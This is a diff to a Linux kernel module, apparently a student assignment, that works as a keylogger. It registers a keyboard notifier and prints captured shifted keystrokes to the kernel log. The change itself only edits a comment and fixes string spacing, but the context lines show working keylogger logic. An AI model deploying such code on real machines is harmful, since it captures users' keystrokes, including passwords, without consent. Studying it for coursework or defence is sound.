@@ -20,7 +20,7 @@ int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_p
 			down(&sem);
 			if (shiftKeyPressed == 0);
 			//if Shift is not pressed then it is not logged
-			// printk(KERN_INFO "%s\n",keymap[param->value]);
+			// so no action will be taken
 			else
 			if((param->value > 15 && param->value<=25) || (param->value > 29 && param->value<=38) || (param->value>43 && param->value<=50))
 			printk(KERN_INFO "%s\n",keymapShiftActivated[param->value]);
@@ -36,7 +36,7 @@ static struct notifier_block keylogger_nb ={
 int init_module(void){	
 	register_keyboard_notifier(&keylogger_nb);
 	//printing initializing message
-	printk(KERN_INFO "I am Bazif , CED17i015 the keylogger" "notifier list\n");
+	printk(KERN_INFO "I am Bazif , CED17i015 the keylogger" " notifier list\n");
 	sema_init(&sem, 1);
 	return 0;
 }
